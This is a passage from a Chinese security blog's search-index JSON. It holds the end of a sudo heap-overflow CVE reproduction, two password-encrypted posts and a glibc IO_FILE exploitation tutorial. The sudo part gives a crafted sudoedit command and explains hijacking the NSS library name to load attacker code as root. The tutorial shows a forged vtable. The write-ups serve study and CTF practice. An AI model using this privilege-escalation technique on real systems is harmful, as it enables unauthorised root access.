<code>setlocale(LC_ALL,&quot;C&quot;)</code>，会释放当前 <code>_nl_global_locale.__names</code>中的堆块，总共释放11个堆块，然后将 <code>_nl_global_locale.__names</code>中的值指向全局变量 <code>C</code>.</p>\n<p>然后执行 <code>setlocale(LC_ALL,saved_LC_ALL)</code>，将保存的值又重新赋给 <code>_nl_global_locale.__names</code>。这里是否需要重新申请堆块，以及更新 <code>_nl_global_locale.__names</code>中的值，需要按照上述分析的要求。</p>\n<p>再次执行 <code>setlocale(LC_ALL，NULL)</code>，获取当前的值。最后，再次释放当前 <code>_nl_global_locale.__names</code>中的堆块</p>\n<p><strong>malloc(user_args)</strong></p>\n<p>当我们分配 <code>user_args</code>是，总体的命令如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">env -i LC_ALL&#x3D;C.UTF-8@+&quot;C&quot;*212 sudoedit -s 56*&#39;A&#39;+&#39;\\&#39; &#39;\\&#39; 54*&#39;B&#39;+&#39;\\&#39;</span><br></pre></td></tr></table></figure>\n<p><code>NewArgv[1] = 56‘A’+’\\’</code>，总长度为58。<br><code>NewArgv[2] = ‘\\’</code>，总长度为2。<br><code>NewArgv[3] = 54‘B’+’\\’</code>，总长度为56。<br><code>user_args</code>需要的长度就是58+2+56=0x74。</p>\n<p>所以会申请 <code>0x80</code>的堆块，而我们之前 有一块 <code>0x80</code>的堆块位于 <code>tcache</code>中，且位于 <code>group systemd</code>堆块的上方。所以这里正好将这个 <code>0x80</code>的堆块分配出来。随后利用堆溢出覆盖 <code>group systemd</code>堆块。</p>\n<h1 id=\"0x09-总结\"><a href=\"#0x09-总结\" class=\"headerlink\" title=\"0x09 总结\"></a>0x09 总结</h1><p>通过堆溢出劫持堆上的struct service_user结构体中的library指针为NULL以通过一些检查。 接着覆写service_user中的name变量为”X/X”，这样做的目的在于，当函数正常执行时，会做如下的文件路径拼接：”libnss” + name + “.so.2”，正常情况下是：libnss_systemd.so.2，而当我们劫持了name后就变成了：”libnss_X/P0P_SH3LLZ_.so.2”，然后使用___libc_dlopen进行加载。</p>\n","categories":[],"tags":["CVE复现"]},{"title":"vmpwn","url":"https://pz1o.top/2021/03/29/vmpwn/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> 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 </div>","categories":[],"tags":["PWN"]},{"title":"My RUST","url":"https://pz1o.top/2021/03/25/My-RUST/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["RUST"]},{"title":"IO_FILE","url":"https://pz1o.top/2021/03/25/IO-FILE/","content":"<h1 id=\"0x01-FILE结构\"><a href=\"#0x01-FILE结构\" class=\"headerlink\" title=\"0x01 FILE结构\"></a>0x01 FILE结构</h1><h2 id=\"1-FILE-介绍\"><a href=\"#1-FILE-介绍\" class=\"headerlink\" title=\"1.FILE 介绍\"></a>1.FILE 介绍</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> &#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags;       <span class=\"comment\">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _IO_file_flags _flags</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_ptr;   <span class=\"comment\">/* Current read pointer */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_end;   <span class=\"comment\">/* End of get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_read_base;  <span class=\"comment\">/* Start of putback+get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_base; <span class=\"comment\">/* Start of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_ptr;  <span class=\"comment\">/* Current put pointer. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_write_end;  <span class=\"comment\">/* End of put area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_base;   <span class=\"comment\">/* Start of reserve area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span>* _IO_buf_end;    <span class=\"comment\">/* End of reserve area. */</span></span><br><span class=\"line\">  <span class=\"comment\">/* The following fields are used to support backing up and undo. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_base; <span class=\"comment\">/* Pointer to start of non-current get area. */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_backup_base;  <span class=\"comment\">/* Pointer to first valid character of backup area */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *_IO_save_end; <span class=\"comment\">/* Pointer to end of non-current get area. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_marker</span> *_<span class=\"title\">markers</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">chain</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _fileno;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _blksize;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> _flags2;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">  _IO_off_t _old_offset; <span class=\"comment\">/* This used to be _offset but it's too small.  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __HAVE_COLUMN <span class=\"comment\">/* temporary */</span></span></span><br><span class=\"line\">  <span class=\"comment\">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> short _cur_column;</span><br><span class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">char</span> _vtable_offset;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> _shortbuf[<span class=\"number\">1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_lock_t *_lock;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_complete</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> _<span class=\"title\">file</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class=\"line\">  _IO_off64_t _offset;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class=\"line\">  <span class=\"comment\">/* Wide character stream stuff.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_codecvt</span> *_<span class=\"title\">codecvt</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_wide_data</span> *_<span class=\"title\">wide_data</span>;</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE</span> *_<span class=\"title\">freeres_list</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *_freeres_buf;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *__pad1;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *__pad2;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *__pad3;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *__pad4;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> __pad5;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> _mode;</span><br><span class=\"line\">  <span class=\"comment\">/* Make sure we don't get into trouble again.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> _unused2[<span class=\"number\">15</span> * <span class=\"keyword\">sizeof</span> (<span class=\"keyword\">int</span>) - <span class=\"number\">4</span> * <span class=\"keyword\">sizeof</span> (<span class=\"keyword\">void</span> *) - <span class=\"keyword\">sizeof</span> (<span class=\"keyword\">size_t</span>)];</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>正常的链表如图所示，通常由IO_list_all是链表头部，之后是用chain链连起来</p>\n<p><img src=\"/2021/03/25/IO-FILE/20210218150610948.png\" alt=\"在这里插入图片描述\"></p>\n<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。<strong>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</strong></p>\n<blockquote>\n<p>_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p>\n<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">IO_FILE_plus</span></span></span><br><span class=\"line\"><span class=\"class\">&gt;&#123;</span></span><br><span class=\"line\">   _IO_FILE    file;</span><br><span class=\"line\">   IO_jump_t   *vtable;</span><br><span class=\"line\">&gt;&#125;</span><br></pre></td></tr></table></figure>\n<p><code>vtable</code>（虚表）：是<code>IO_jump_t</code> 类型的指针，<code>IO_jump_t</code>中保存了一些函数指针。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;<span class=\"keyword\">void</span> * funcs[] = &#123;</span><br><span class=\"line\">  <span class=\"number\">1</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// \"extra word\"</span></span><br><span class=\"line\">  <span class=\"number\">2</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// DUMMY</span></span><br><span class=\"line\">  <span class=\"number\">3</span> <span class=\"built_in\">exit</span>, <span class=\"comment\">// finish</span></span><br><span class=\"line\">  <span class=\"number\">4</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// overflow</span></span><br><span class=\"line\">  <span class=\"number\">5</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// underflow</span></span><br><span class=\"line\">  <span class=\"number\">6</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// uflow</span></span><br><span class=\"line\">  <span class=\"number\">7</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// pbackfail</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"number\">8</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// xsputn  #printf</span></span><br><span class=\"line\">  <span class=\"number\">9</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// xsgetn</span></span><br><span class=\"line\">  <span class=\"number\">10</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// seekoff</span></span><br><span class=\"line\">  <span class=\"number\">11</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// seekpos</span></span><br><span class=\"line\">  <span class=\"number\">12</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// setbuf</span></span><br><span class=\"line\">  <span class=\"number\">13</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// sync</span></span><br><span class=\"line\">  <span class=\"number\">14</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// doallocate</span></span><br><span class=\"line\">  <span class=\"number\">15</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// read</span></span><br><span class=\"line\">  <span class=\"number\">16</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// write</span></span><br><span class=\"line\">  <span class=\"number\">17</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// seek</span></span><br><span class=\"line\">  <span class=\"number\">18</span> pwn,  <span class=\"comment\">// close</span></span><br><span class=\"line\">  <span class=\"number\">19</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// stat</span></span><br><span class=\"line\">  <span class=\"number\">20</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// showmanyc</span></span><br><span class=\"line\">  <span class=\"number\">21</span> <span class=\"literal\">NULL</span>, <span class=\"comment\">// imbue</span></span><br><span class=\"line\">&gt;&#125;;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"2-fread\"><a href=\"#2-fread\" class=\"headerlink\" title=\"2.fread\"></a>2.fread</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">size_t</span> <span class=\"title\">fread</span> <span class=\"params\">( <span class=\"keyword\">void</span> *<span class=\"built_in\">buffer</span>, <span class=\"keyword\">size_t</span> <span class=\"built_in\">size</span>, <span class=\"keyword\">size_t</span> count, FILE *stream)</span> 